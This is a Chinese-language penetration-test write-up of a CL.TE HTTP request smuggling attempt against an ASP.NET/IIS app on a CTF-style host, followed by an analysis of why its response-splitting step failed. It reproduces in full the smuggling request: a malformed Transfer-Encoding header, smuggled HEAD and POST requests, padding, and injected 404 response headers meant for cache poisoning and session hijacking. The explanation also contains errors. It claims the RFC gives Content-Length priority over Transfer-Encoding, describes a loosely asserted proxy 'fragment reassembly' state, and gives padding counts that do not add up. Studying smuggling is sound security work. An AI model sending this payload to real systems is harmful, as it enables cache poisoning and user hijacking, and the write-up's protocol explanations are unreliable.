# CL.TE 请求走私下的响应分割攻击失败根因分析

---

# 0x01 背景与攻击意图

在一次针对某 ASP.NET + IIS 应用的渗透测试中，观察到了典型的 CL.TE 请求走私漏洞。目标前端存在 WAF / 代理，后端为 ASP.NET，且存在一个特殊的回显端点 `HttpER.aspx`：无论向其 `LzPostExecExpression` 参数传入什么内容，响应体都会原封不动地返回该内容，并且不附加任何额外字符或 HTML 包裹。

攻击者试图利用该 CL.TE 漏洞实施 **响应分割（Response Splitting）** 攻击：将精心构造的 `HTTP/1.1 404 Not Found ...` 响应头注入到 TCP 流中，使得前端代理误将其当作下一个请求的合法响应，从而污染缓存、劫持其他用户会话或实现 XSS。然而，虽然成功实现了请求走私与响应队列错位，但预期的“伪造响应独立返回”并未发生。本文从 HTTP 协议解析本质、代理状态机机制以及与 TRACE 攻击的对比三个层面，深度剖析此次攻击失败的根源。

- 请求-1

```http
POST /login.aspx HTTP/1.1
Host: aaaa.bbbb.ctf.cc
Cache-Control: max-age=0
Origin: http://aaaa.bbbb.ctf.cc
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html
Referer: http://aaaa.bbbb.ctf.cc/index.aspx
Accept-Language: zh-CN,zh;q=0.9
Cookie: ASP.NET_SessionId=x3wjhu5mvvlkmx2xikupjkfz; loginlx=0; jscookietest=valid; uun=6bf312d0eefbc23ba2c48fd67f82848e1_1
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="142", "Google Chrome";v="142"
sec-ch-ua-mobile: ?0
Connection: keep-alive
Content-Length: 2538
Transfer-Encoding :
 chunked

0

HEAD /searchation/MkActions/ElectronDocument/MultiFileView2.html HTTP/1.1
Host: aaaa.bbbb.ctf.cc
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

POST /searchation/MkActions/HttpER/HttpER.aspx HTTP/1.1
Host: aaaa.bbbb.ctf.cc
Content-Length: 1701
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Connection: keep-alive

LzPostExecExpression=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxHTTP/1.1 404 Not Found
Cache-Control: private
Content-Type: text/html; charset=gb2312
X-UA-Compatible: IE=Edge
X-XSS-Protection: 1;mode=block
Access-Control-Allow-Origin: *
Referrer-Policy: origin-when-cross-origin
X-Permitted-Cross-Domain-Policies: master-only
X-Frame-Options: ALLOWALL
Strict-Transport-Security: max-age=31536000
X-Download-Options: noopen
Access-Control-Allow-Headers: Content-Type, api_key, Authorization
Date: Thu, 14 May 2026 08:15:36 GMT
Content-Length: 3260

```

- 响应-1

```http
HTTP/1.1 404 Not Found
...
```

- 请求-2

```http
GET /Utility/Script/login.js HTTP/1.1
Host: aaaa.bbbb.ctf.cc
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
Referer: http://aaaa.bbbb.ctf.cc/index.aspx
Accept: */*
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

```

- 响应-2

```http
HTTP/1.1 200 OK
Content-Length: 1447
Content-Type: text/html
Last-Modified: Thu, 31 Oct 2013 03:18:03 GMT
Accept-Ranges: bytes
ETag: "9be254cfe7d5ce1:0"
Date: Thu, 14 May 2026 08:17:32 GMT

HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/8.5
Set-Cookie: ASP.NET_SessionId=qikvp5b11yiihabmz04xigmj; path=/; HttpOnly
X-Powered-By: ASP.NET
Date: Thu, 14 May 2026 08:17:32 GMT
Content-Length: 1680

xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```



- 请求-3

```http
GET /Common/Dialog/WebUI/Client/Sql/sql.js HTTP/1.1
Host: aaaa.bbbb.ctf.cc
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
x-forwarded-for: 127.0.0.1
cookie: ASP.NET_SessionId=mnv3e1f2hrwov3ap4josebaa; UserAccount=8iiWpJQLZdHJ8Lk3hVnIEQ==
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="142", "Google Chrome";v="142"
sec-ch-ua-mobile: ?0
Connection: keep-alive

```

- 响应-3

```http
HTTP/1.1 200 OK
Content-Type: application/javascript
Last-Modified: Wed, 25 Sep 2013 09:25:28 GMT
Accept-Ranges: bytes
.....
```

---

# 0x02 攻击链路构造

## 2.1 利用 CL.TE 走私

请求 1 发送了一个精心构造的 `POST /login.aspx`，同时包含 `Content-Length: 2538` 和畸形的 `Transfer-Encoding : chunked`（中间有空格和换行），导致前端代理（WAF）与后端对该请求边界的解读出现分歧：

- **前端（WAF）**：根据 RFC 要求，优先信任 `Content-Length`，因此将整个请求体的 2538 字节作为当前请求的数据。
- **后端（IIS/ASP.NET）**：因 `Transfer-Encoding` 存在且格式畸变，可能忽略 `Content-Length` 并采用 `chunked` 解析，看到 `0\r\n` 即认为请求体结束。

于是，`0\r\n` 之后的数据被后端解析为两个共享该连接的新请求：

1. `HEAD /searchation/MkActions/ElectronDocument/MultiFileView2.html`
2. `POST /searchation/MkActions/HttpER/HttpER.aspx`（包含超长 padding 与注入的 404 响应头）

这构成了典型的 **请求走私**，并使得后端处理了额外的“隐式”请求。

## 2.2 精确 Padding 与 HEAD 响应的配合

攻击者注意到 `/MultiFileView2.html` 的 `Content-Length: 1447`。为了利用这个数字，他在 `HttpER.aspx` 的请求体中精心放置了大量 `x` 字符（1181 个）作为填充，使得 `HttpER.aspx` 返回的响应（包含 padding 与注入的 404 响应头）的 **前 1447 字节** 刚好是填充字符，而紧接其后的便是 `HTTP/1.1 404 Not Found ...` 完整响应头。

攻击规划如下：

- WAF 看不到后面两个走私请求，它只看到正常的 `POST /login.aspx` 及其响应（404），然后继续处理下一个正常的 `GET /Utility/Script/login.js` 请求。
- WAF 向 `/login.js` 返回的应是后者正常的 200 响应，但由于走私导致后端额外产生了 HEAD 请求的响应，该响应带有 `Content-Length: 1447` 且无 body（HEAD 方法）。
- WAF 此时认为 `/login.js` 的响应 body 长度应为 1447，于是它会从 TCP 流中继续读取恰好 1447 字节作为 body。这部分字节恰好是 `HttpER.aspx` 相应返回的 1447 字节填充，因此被顺利消费。
- 1447 字节消费完毕后，TCP 流中紧接着就是注入的 `HTTP/1.1 404 Not Found ...` 完整响应头和垫后的 `Content-Length: 3260`（故意留空指示后续有 body 但内容由攻击者控制）。攻击者预期此时 WAF 已完成 `/login.js` 响应的 body 读取，状态机应重置，并将该伪造响应作为下一个请求 `/sql.js` 的响应返回给客户端。

## 2.3 实际现象

然而，攻击者观察到的最终结果是 **响应-3 收到的却是请求-2（`/login.js`）的正常响应**，而伪造的 404 响应并未独立呈现。虽然发生了响应队列错位（表明请求走私与 HEAD 响应长度利用成功），但伪造响应却未被前端解析为独立 HTTP 消息。

---

# 0x03 失败原因：前端 HTTP 状态机未合法复位

## 3.1 HTTP 解析器是状态机，不是字符串扫描器

HTTP 是文本协议，但其解析器（parser）并非基于全文搜索 “HTTP/1.1” 的模式匹配器，而是一个严格的状态机。一个典型的响应解析状态跃迁如下：

```text
READ_STATUS_LINE → (解析状态行)
READ_HEADERS     → (逐行读取首部直到空行)
READ_BODY        → (根据 Content-Length 或 chunked 消费 body)
RESPONSE_DONE    → (响应结束，等待下一个响应)
```

关键点在于：**只有在 `READ_STATUS_LINE` 状态下，解析器才会将字节流解释为 “HTTP/1.1 200 OK” 这样的响应行。** 一旦进入 `READ_BODY` 状态，解析器将无视 body 内容的任何语义，仅仅按字节数消费数据。

## 3.2 为什么读完 Content-Length 不等于状态复位？

用户认为：“WAF 根据 `Content-Length: 1447` 读完 body 后，剩余字节自然就是下一个响应，因此会进入 `READ_STATUS_LINE` 状态”。这在理论上符合 HTTP 规范：当响应 body 已被完全消费（通过 Content-Length 或 chunked 结束），且连接未关闭时，下一个到达的数据就是下一个响应的开始。

但在真实代理 / WAF 实现中，还存在以下额外步骤：

- **流重组**：在 1447 字节被消费后，TCP 流缓冲区中可能残留部分字节。代理必须确认先前响应的“帧”是完整且干净的，没有跨消息的碎片。
- **同步校验**：为了防止解析器因 body 中包含类似 “HTTP/1.1” 的字符串而错误复位，实现通常要求只有在 **显式帧边界（帧结束标记）** 之后，状态机才会从 `RESPONSE_DONE` 切换到 `READ_STATUS_LINE`。而用户构造的边界恰好 **缺失了这种“干净终止”的标记**。

## 3.3 残余字节被当作流碎片而非新响应

当 WAF 消费完 1447 字节后，TCP 缓冲区中是 `HTTP/1.1 404 Not Found...`。对代理而言，这些字节 **紧跟在已被处理的 body 之后**，且没有任何协议帧的界定（如 chunked 结束的 `0\r\n\r\n` 或明确的帧尾标记）。因此，代理的状态机并未跳回 `READ_STATUS_LINE`，而是进入了某种 **流延续 / 碎片重组状态（Stream Continuation / Fragment Reassembly）**。在此状态下，任何数据都被视为上一响应残留或需要对齐的碎片，不会启动新的响应头解析。

这就解释了为什么 `HTTP/1.1 404...` 没有成为新响应：它被代理当作了无法识别的流碎片，最终要么被丢弃，要么在下一个连接周期中被误消费（导致进一步错位），但绝不会作为独立的 HTTP 响应返回给客户端。

## 3.4 缺少嵌套解析触发器（TRACE 攻击的成功关键）

[PortSwigger](https://portswigger.net/research/trace-desync-attack) 的 TRACE 攻击之所以能成功，是因为其利用了 `Content-Type: message/http` 的 MIME 类型。该类型显式告知代理：“这个 body 内部包含一个完整的 HTTP 消息”。此时，代理会启动一个 **嵌套的 HTTP 解析器**（二次解析），从而将注入的 `HTTP/1.1 200 OK` 等当作真实响应处理，最终完成响应分割与缓存投毒。

在此次攻击中，`HttpER.aspx` 返回的 Content-Type 是普通的 `text/html`，没有任何语义触发器。因此，代理不会对 body 内容进行二次 HTTP 解析，伪造响应自然无法生效。

---

# 0x04 对比与总结

| 要素         | 本次攻击                              | PortSwigger TRACE 攻击                            |
| ------------ | ------------------------------------- | ------------------------------------------------- |
| 走私方式     | CL.TE 导致隐式 HEAD 与 POST           | HTTP/2 downgrade 导致 smuggling                   |
| 响应分割手段 | 利用 HEAD 的 CL 配合 padding 控制边界 | 利用 TRACE + message/http 引发嵌套解析            |
| 状态机行为   | 残留字节被视为流碎片，无法自动复位    | 代理主动解析特定 MIME 类型的 body，进入二次状态机 |
| 成功所需条件 | 仅字节对齐，缺少协议帧标记            | 具备嵌套 HTTP 解析能力                            |

**一句话结论：**

> 攻击失败的根本原因并非 Content-Length 对齐不够精确，而是 **前端 HTTP 解析器的状态机仅靠“字节消费完成”无法复位，必须依赖明确的帧结束标记或嵌套解析触发器**。在没有任何此类机制的情况下，TCP 流中残留的 `HTTP/1.1 404 Not Found...` 只能被当作不可识别的流碎片，无法成为独立的响应。

这一案例深刻揭示了：请求走私利用不仅需要制造数据偏移，更需要理解代理内部的状态管理与流重组逻辑。响应分割的成功，往往需要额外的协议级“许可”（如 `message/http`）或特殊的帧边界控制技术，而非单纯的字节填充。